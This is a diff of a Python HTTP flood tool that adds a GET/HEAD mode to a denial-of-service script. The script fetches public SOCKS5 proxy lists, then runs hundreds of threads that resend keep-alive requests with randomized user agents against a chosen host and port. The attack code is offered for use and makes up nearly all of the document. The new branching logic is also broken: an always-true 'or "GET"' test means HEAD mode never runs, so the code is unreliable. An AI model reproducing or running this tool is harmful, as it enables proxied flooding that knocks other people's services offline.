@@ -17,7 +17,7 @@ print('''\r\n
 ██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
 ╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
 ┌─────────────────────────────────────────────────────┐
-│ version 1.0.5                                       │
+│ version 1.0.4                                       │
 │                                                     │
 │            [!!!More User-friendly UI!!!]            │
 │                                                     │
@@ -179,6 +179,12 @@ def main():
     global th_num
     global proxies
     global multiple
+    global mode
+    mode = str(input("Mode You Want To Choose (get/head):"))
+    if mode == "":
+        mode = "GET"
+    else:
+        mode = str(mode)
     ip = str(input("Address/Host:"))
     if ip == "":
         print("Wrong Input! Please Try Again!")
@@ -199,53 +205,97 @@ def main():
         th_num = int(300)
     else:
         th_num = int(th_num)
-    N = str(input("Download socks5 list ?(y/n):"))
-    if N == '':
-        N = "y"
-    if N == 'y':
-        f = open("socks5.txt", 'wb')
-        try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
-            f.write(r.content)
-            f.close()
-        except:
-            f.close()
-        print("Socks Downloaded Sucessful !")
-    else:
-        pass
-    out_file = str(input("Enter Proxy File Path(socks5.txt):"))
-    if out_file == '':
-        out_file = str("socks5.txt")
-    else:
-        out_file = str(out_file)
-    proxies = open(out_file).readlines()
-    print ("Number Of Proxies: %s" %(len(open(out_file).readlines())))
-    time.sleep(0.3)
-    ans = str(input("Check the socks list?(y/n, defualt=y):"))
-    if ans == "":
-        ans = "y"
-    if ans == "y":
-        ms = str(input("Delay of socks(seconds, default=1):"))
-        if ms == "":
-            ms = int(1)
-        else :
+    if mode == "get" and "GET":
+        N = str(input("Download socks5 list ?(y/n):"))
+        if N == '':
+            N = "y"
+        if N == 'y':
+            f = open("socks5.txt", 'wb')
             try:
-                ms = int(ms)
-            except :
-                ms = float(ms)
-        check_socks()
+                r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+                f.write(r.content)
+            except:
+                pass
+            try:
+                r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+                f.write(r.content)
+                f.close()
+            except:
+                f.close()
+            print("Socks Downloaded Sucessful !")
+        else:
+            pass
+        out_file = str(input("Enter Proxy File Path(socks5.txt):"))
+        if out_file == '':
+            out_file = str("socks5.txt")
+        else:
+            out_file = str(out_file)
+        print ("Number Of Socks5 Proxies: %s" %(len(open(out_file).readlines())))
+        proxies = open(out_file).readlines()
+        time.sleep(0.3)
+        ans = str(input("Check the socks list?(y/n, defualt=y):"))
+        if ans == "":
+            ans = "y"
+        if ans == "y":
+            ms = str(input("Delay of socks(seconds, default=1):"))
+            if ms == "":
+                ms = int(1)
+            else :
+                try:
+                    ms = int(ms)
+                except :
+                    ms = float(ms)
+            check_socks()
+            proxies = open(out_file).readlines()
+    elif mode == "head" and "HEAD":
+        N = str(input("Download socks5 list ?(y/n):"))
+        if N == '':
+            N = "y"
+        if N == 'y':
+            f = open("socks5.txt", 'wb')
+            try:
+                r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1000")
+                f.write(r.content)
+            except:
+                pass
+            try:
+                r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+                f.write(r.content)
+                f.close()
+            except:
+                f.close()
+            print("Socks Downloaded Sucessful !")
+        else:
+            pass
+        out_file = str(input("Enter Proxy File Path(socks5.txt):"))
+        if out_file == '':
+            out_file = str("socks5.txt")
+        else:
+            out_file = str(out_file)
+        print ("Number Of Socks5 Proxies: %s" %(len(open(out_file).readlines())))
+        proxies = open(out_file).readlines()
+        time.sleep(0.3)
+        ans = str(input("Check the socks list?(y/n, defualt=y):"))
+        if ans == "":
+            ans = "y"
+        if ans == "y":
+            ms = str(input("Delay of socks(seconds, default=1):"))
+            if ms == "":
+                ms = int(1)
+            else :
+                try:
+                    ms = int(ms)
+                except :
+                    ms = float(ms)
+            check_socks()
+            proxies = open(out_file).readlines()
     multiple = str(input("Input the Multiple(default=100):"))
     if multiple == "":
         multiple = int(100)
     else:
         multiple = int(multiple)
 
-def run():
+def get():
     get_host = "GET " + page + " HTTP/1.1\r\nHost: " + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n"
     accept = random.choice(acceptall)
@@ -258,6 +308,30 @@ def run():
             s = socks.socksocket()
             if port == 443:
                 ctx = ssl.SSLContext()#credits to leeon123
+                s = ctx.wrap_socket(s,server_hostname=str(ip))
+            s.connect((str(ip), int(port)))
+            s.send(str.encode(request))
+            try:
+                for _ in range(multiple):
+                    s.send(str.encode(request))
+            except:
+                s.close()
+        except:
+            s.close()
+
+def head():
+    head_host = "HEAD " + page + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    accept = random.choice(acceptall)
+    ua = random.choice(useragents)
+    request = head_host + ua + accept + connection + "\r\n"
+    proxy = random.choice(proxies).strip().split(":")
+    while True:
+        try:
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+            s = socks.socksocket()
+            if port == 443:
+                ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=str(ip))
             s.connect((str(ip), int(port)))
             s.send(str.encode(request))
@@ -322,10 +396,14 @@ def check_socks():
 n=0
 if __name__ == "__main__":
     main()
-
-for i in range(th_num):
-        th = threading.Thread(target=run,daemon=True)
-        th.start()
+if mode == "get" or "GET":
+    for i in range(th_num):
+            th = threading.Thread(target=get,daemon=True)
+            th.start()
+elif mode == "head" or "HEAD":
+    for i in range(th_num):
+            th = threading.Thread(target=head,daemon=True)
+            th.start()
 
 while True:
         key = ["-","\\","|","/","-"]
